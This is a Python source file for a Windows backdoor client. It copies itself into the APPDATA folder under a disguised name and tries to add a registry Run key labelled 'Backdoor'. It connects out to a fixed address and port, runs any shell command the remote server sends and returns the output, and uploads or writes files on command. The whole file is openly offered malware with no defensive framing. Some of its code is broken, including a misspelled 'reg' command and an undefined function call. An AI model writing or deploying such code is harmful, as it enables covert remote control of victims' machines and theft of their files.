import socket
import os
import subprocess
import sys
import shutil
import time
from PIL import ImageGrab
import tempfile

def registry():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg ass HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'
                        +location + '"', shell=True)

def letGrab (mySocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send('DONE'.encode())
    else:
        mySocket.send('File not found'.encode())

def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, 'ab')
        while True:
            bits = mySocket.recv(5000)
            if bits.endwith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                break
            if 'File not found'.encode() in bits:
                break
            f.write(bits)

def connect():
    registry()
    mySocket = socket.socket()
    mySocket.connect(("10.3.0.128", 8080))

    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())
                break

                #  command format: grab*<File Path>
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] SOME ERROR OCCURED. " + str(e)
                mySocket.send(informToServer.encode())

            #  command format: send*<destination path>*<File Name>
            #     send*C:\Users\Jhon\Desktop\*photo.jpeg
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some Error Occurred. " + str(e)
                mySocket.send(informToServer.encode())
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some Error Occurred, " + str(e)
                mySocket.send(informToServer.encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE,
                                   stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def initiate():
    registry()
    tuneConnection()

def tuneConnection():
    mySocket = socket.socket()
    #Trying to connect to server every 20 seconds
    while True:
        time.sleep(20)
        try:
            mySocket.connect(("10.3.0.128", 8080))
            shell(mySocket)

        except:
            tuneConnection()


def main():
    connect()
main()